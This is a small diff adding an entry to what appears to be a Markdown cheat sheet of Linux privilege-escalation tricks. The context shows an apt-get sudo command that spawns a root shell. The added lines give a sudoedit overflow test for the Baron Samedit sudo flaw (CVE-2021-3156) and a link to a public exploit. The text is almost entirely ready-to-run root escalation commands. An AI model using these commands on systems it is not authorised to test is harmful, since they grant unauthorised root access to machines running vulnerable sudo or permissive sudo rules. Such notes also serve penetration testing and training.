@@ -71,4 +71,10 @@
 ### PRIVESC WITH APT-GET IF A USER CAN RUN IT WITH SUDO
 
     sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-    
+### Privesc on sudo version 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1 [Baron Samedit]
+
+  ### Test it with
+
+    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+- Link to exploit <a href="https://github.com/blasty/CVE-2021-3156">Link to exploit</a>
+  
